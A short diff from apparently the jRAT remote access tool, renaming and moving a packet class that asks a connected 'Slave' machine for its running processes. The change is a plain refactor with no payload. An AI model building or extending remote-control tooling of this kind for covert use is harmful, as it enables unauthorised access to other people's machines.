@@ -1,19 +1,20 @@
-package jrat.controller.packets.outgoing;
+package jrat.module.process;
 
 import jrat.controller.Slave;
+import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 
 import java.io.DataOutputStream;
 
 
-public class Packet19ListProcesses extends AbstractOutgoingPacket {
+public class PacketQueryProcesses extends AbstractOutgoingPacket {
 	
 	private boolean icons;
 	
-	public Packet19ListProcesses() {
+	public PacketQueryProcesses() {
 		this(false);
 	}
 	
-	public Packet19ListProcesses(boolean icons) {
+	public PacketQueryProcesses(boolean icons) {
 		this.icons = icons;
 	}
 
